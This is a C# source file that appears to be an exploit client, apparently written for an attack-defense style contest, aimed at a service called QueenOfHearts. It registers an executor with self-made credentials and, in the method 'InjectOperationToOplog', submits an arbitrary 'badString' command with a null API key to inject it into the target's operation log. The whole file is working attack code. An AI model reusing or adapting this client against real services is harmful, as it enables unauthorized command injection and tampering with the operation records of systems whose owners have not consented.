using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Net.Http.Json;
using QueenOfHearts.CoreLibrary.Models;
using QueenOfHearts.CoreLibrary.Serialization;

namespace QExecute.Sploit
{
    class Client
    {
        private readonly HttpClient _httpClient;
        private string _host;
        private int _port;

        public Client(string host, int port)
        {
            _host = host;
            _port = port;
            _httpClient = new HttpClient();
        }

        public IEnumerable<String> GetCommands()
        {
            var httpResponseMessage = _httpClient.GetAsync(GetUri("/commandList")).Result;
            httpResponseMessage.EnsureSuccessStatusCode();
            return httpResponseMessage.Content.ReadFromJsonAsync<IEnumerable<String>>().Result;
        }
        
        public AuthorizedRequest AddExecutor()
        {
            var executor = new AuthorizedRequest
            {
                ExecutorId = Guid.NewGuid().ToString(),
                ExecutorApiKey = Guid.NewGuid().ToString()
            };
            var result = _httpClient.PutAsync(GetUri("/executor"), new StringContent(executor.ToJson())).Result;
            result.EnsureSuccessStatusCode();
            return executor;
        }

        public AddCommandRequest InjectOperationToOplog(string badString)
        {
            var executor = new AddCommandRequest()
            {
                CommandName = badString,
                ExecutorApiKey = null
            };
            var result = _httpClient.PutAsync(GetUri("/command"), new StringContent(executor.ToJson())).Result;
            return executor;
        }
        
        public Command GetCommand(GetCommandRequest getCommand)
        {
            var httpRequestMessage = new HttpRequestMessage()
            {
                RequestUri = new Uri(GetUri("/command")),
                Content = new StringContent(getCommand.ToJson())
            };
            var httpResponseMessage = _httpClient.SendAsync(httpRequestMessage).Result;
            httpResponseMessage.EnsureSuccessStatusCode();
            return httpResponseMessage.Content.ReadFromJsonAsync<Command>().Result;
        }
        
        private string GetUri(string victims)
        {
            var builder = new UriBuilder
            {
                Host = _host,
                Path = victims,
                Port = _port
            };
            var requestUri = builder.ToString();
            return requestUri;
        }

    }
}